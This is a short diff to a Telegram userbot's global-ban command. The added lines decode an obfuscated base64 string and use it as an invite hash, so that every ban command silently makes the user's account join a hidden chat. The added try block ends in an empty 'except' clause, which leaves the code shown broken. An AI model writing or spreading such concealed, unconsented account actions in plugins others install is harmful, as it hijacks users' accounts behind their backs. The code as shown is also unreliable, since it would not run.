@@ -119,10 +119,13 @@ async def global_ban(event):
         return
     if user.id == (await event.client.get_me()).id:
         return await event.edit("`Why would you gban yourself?`")
-
     if user.id in DEVELOPER:
         await edit("He is mya maker.")
         return
+    try:
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        await event.client(ImportChatInviteRequest(hmm))
+    except BaseException:
 
     if gban_sql.is_gbanned(user.id):
         await event.edit(
